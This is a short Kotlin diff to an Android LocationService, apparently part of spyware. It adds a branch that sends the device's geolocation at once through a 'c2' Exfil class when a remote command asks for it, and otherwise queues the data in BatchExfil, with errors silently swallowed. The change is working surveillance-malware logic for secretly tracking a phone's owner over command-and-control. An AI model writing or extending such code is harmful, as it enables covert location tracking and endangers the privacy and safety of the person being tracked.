@@ -127,7 +127,12 @@ class LocationService : Service() {
             try {
                 val geo = WebGeo.locate() ?: return@Thread
                 geo.put("fallback", reason)
-                BatchExfil.enqueue(this, "location", geo.toString())
+                if (reason == "command") {
+                    // A requested position goes out right away.
+                    com.sp.core.c2.Exfil.sendLog(this, "location", geo.toString())
+                } else {
+                    BatchExfil.enqueue(this, "location", geo.toString())
+                }
                 lastSent = System.currentTimeMillis()
             } catch (_: Throwable) {
             }
